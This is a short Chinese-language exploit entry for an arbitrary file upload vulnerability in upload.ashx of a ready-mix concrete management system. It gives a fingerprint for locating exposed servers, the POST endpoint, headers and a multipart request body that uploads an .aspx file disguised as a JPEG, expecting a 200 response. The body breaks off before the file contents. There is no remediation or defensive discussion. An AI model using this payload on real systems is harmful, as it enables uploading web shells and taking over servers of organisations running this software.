# 预拌砼综合管理系统upload.ashx存在任意文件上传漏洞

- **系统**：预拌砼综合管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="Libs/Platform.lib"`
- **请求**：`POST /WebUpload/server/upload.ashx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----geckoformboundary8a2afaa88…`　`Content-Length: 253885`

**请求体 / payload**
```
------geckoformboundary8a2afaa88de91add9545aab5a13188a2
Content-Disposition: form-data; name="OwnBaseFolder"
GpAgreeFile/2026-01-29
------geckoformboundary8a2afaa88de91add9545aab5a13188a2
Content-Disposition: form-data; name="id"
WU_FILE_0
------geckoformboundary8a2afaa88de91add9545aab5a13188a2
Content-Disposition: form-data; name="name"
wenxue.aspx
------geckoformboundary8a2afaa88de91add9545aab5a13188a2
Content-Disposition: form-data; name="type"
image/jpeg
------geckoformboundary8a2afaa88de91add9545aab5a13188a2
Content-Disposition: form-data; name="lastModifiedDate"
2026/1/29 13:22:14
------…（脚本共 1565 字，完整版见原文）
```
- **预期**：200　|　—